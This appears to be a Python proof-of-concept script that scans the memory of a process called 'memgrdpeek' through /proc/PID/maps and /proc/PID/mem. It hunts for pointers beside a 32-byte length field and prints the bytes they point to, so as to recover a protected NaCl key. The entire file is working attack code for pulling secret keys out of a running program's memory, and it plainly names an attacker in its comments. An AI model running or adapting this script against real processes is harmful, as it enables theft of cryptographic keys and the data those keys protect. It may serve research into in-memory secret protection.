#!/usr/bin/python

# Thanks for the inspiration: github.com/Vayu/vault_recover
# and github.com/hashicorp/vault/issues/1446

import argparse
import logging
import struct
from subprocess import Popen, PIPE

# Attacker knows default size of nacl key
KEY_SIZE = 32
# After we find a valid memory pointer, we'll read past KEY_SIZE in order to catch data after that point
EAGER_READ = KEY_SIZE * 3

def running_procs(name):
    subproc = Popen(['ps', '-o', 'pid,uid', '--no-headers', '-C', name], shell=False, stdout=PIPE)
    candidates = [line.split() for line in subproc.stdout]
    return candidates


def get_maps(pid, mode='w'):
    maps = []
    with open('/proc/{0}/maps'.format(pid), 'r') as f:
        for line in f:
            address, perms, offset, dev, inode, name = line.replace('\n', ';').split(None, 5)
            if int(offset, 16) != 0 or int(inode) != 0 or mode not in perms:
                continue
            addr_lo, addr_hi = [int(s, 16) for s in address.split('-')]
            score = int('[stack' in name) + int('[heap' in name) + int(':' in name)
            maps.append((score, addr_lo, addr_hi, name))
    maps.sort(reverse=True)
    return [m[1:] for m in maps]


def scan_addr_range(pid, addr_lo, addr_hi, name, try_harder=False):
    logging.info('Scanning pid {0} range {1:x}-{2:x} {3}'.format(pid, addr_lo, addr_hi, name))

    plen = struct.calcsize('@P')
    pointers = []
    p0 = 0
    p1 = 0
    p2 = 0
    with open('/proc/{0}/mem'.format(pid), 'rb') as f:
        f.seek(addr_lo, 0)
        for n in range((addr_hi - addr_lo) / plen):
            data = f.read(plen)
            p0, = struct.unpack('@P', data)
            if addr_lo <= p2 < addr_hi and (p1 == KEY_SIZE or try_harder):
                if p2 not in pointers:
                    pointers.append(p2)
            p2 = p1
            p1 = p0

        logging.info('Found {0} candidate pointers'.format(len(pointers)))
        pointers.sort()
        for n, p in enumerate(pointers):
            f.seek(p, 0)
            key = f.read(EAGER_READ)
            print('{0}:\t\t{1}'.format(p, key))
            #print(p, key) # Prints key in hex

def main():
    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description='Recover protected key from memory of memgrdpeek process')
    parser.add_argument('--pid', required=False, default=None,
                        help='Process id of the app process')
    parser.add_argument('--try-harder', required=False, default=False, action='store_true',
                        help='Try harder')
    args = parser.parse_args()

    if args.pid:
        procs = [(args.pid, 0)]
    else:
        procs = running_procs('memgrdpeek')
        if not procs:
            logging.error('Cannot find memgrdpeek process. Try setting --pid parameter or use sudo.')
            return

    for pid, uid in procs:
        logging.info('Trying pid {0}'.format(pid))
        for addr_lo, addr_hi, name in get_maps(pid):
            scan_addr_range(pid, addr_lo, addr_hi, name, try_harder=args.try_harder)


if __name__ == '__main__':
    main()
